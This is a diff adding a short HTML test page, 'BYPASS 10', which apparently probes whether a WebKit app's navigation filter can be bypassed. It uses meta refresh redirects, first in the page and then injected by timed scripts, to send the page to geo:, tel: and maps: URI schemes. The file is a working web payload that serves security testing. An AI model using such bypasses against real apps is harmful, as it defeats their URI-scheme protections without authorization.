@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>.</title>
+  <!--
+    BYPASS 10: meta refresh to URI scheme
+
+    meta refresh triggers navigation with navigationType = .other
+    BUT it fires from the HTML parser, not from JavaScript.
+    This is a subtly different code path in WebKit.
+
+    The navigation delegate receives it, but the timing is different:
+    meta refresh fires during document load, before DOMContentLoaded.
+    The isMainFrame check might not be fully initialized at this point.
+  -->
+
+  <!-- Direct meta refresh to geo: -->
+  <meta http-equiv="refresh" content="0;url=geo:0,0">
+</head>
+<body>
+<script>
+  // Backup: if meta refresh doesn't work for geo:, try injecting more
+  setTimeout(function() {
+    // Create a new meta refresh dynamically
+    var meta = document.createElement('meta');
+    meta.httpEquiv = 'refresh';
+    meta.content = '0;url=tel:+1234567890';
+    document.head.appendChild(meta);
+  }, 500);
+
+  setTimeout(function() {
+    var meta = document.createElement('meta');
+    meta.httpEquiv = 'refresh';
+    meta.content = '0;url=maps:0,0';
+    document.head.appendChild(meta);
+  }, 1000);
+</script>
+</body>
+</html>
